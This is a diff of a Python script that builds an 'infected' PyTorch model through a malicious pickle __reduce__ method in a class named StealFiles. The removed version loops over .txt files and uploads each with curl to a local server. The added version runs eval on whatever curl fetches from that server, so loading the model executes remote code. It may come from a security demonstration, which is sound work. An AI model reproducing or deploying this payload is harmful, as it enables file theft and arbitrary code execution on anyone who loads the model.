@@ -1,15 +1,11 @@
 import os
 import torch
-
+from simple_model import SimpleModel
+SimpleModel()
 
 class StealFiles:
     def __reduce__(self):
-        return os.system, (f"""
-for file in $(find . -type f -name "*.txt"); do
-    echo "Stealing file: $file"
-    curl -F "file=@$file" http://localhost:8080 -o /dev/null -s
-done > /dev/null
-""",)
+        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)
 
 
 def make_infected_model():
